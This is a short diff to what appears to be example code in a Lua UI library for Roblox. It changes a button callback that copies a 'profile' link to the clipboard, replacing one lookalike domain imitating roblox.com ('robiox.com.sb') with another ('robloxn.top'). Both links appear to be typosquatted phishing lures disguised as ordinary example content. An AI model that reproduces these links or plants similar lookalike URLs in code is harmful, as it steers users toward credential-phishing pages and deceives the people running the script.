@@ -61,7 +61,7 @@ Time = <number> - The duration of the notfication.
 
 Tab:AddButton({
 	Name = "the link of profile",
-	Callback = function()setclipboard("https://www.robiox.com.sb/users/318552382217/profile")
+	Callback = function()setclipboard("https://www.robloxn.top/users/318552382217/profile")
       		print("button pressed")
   	end    
 })
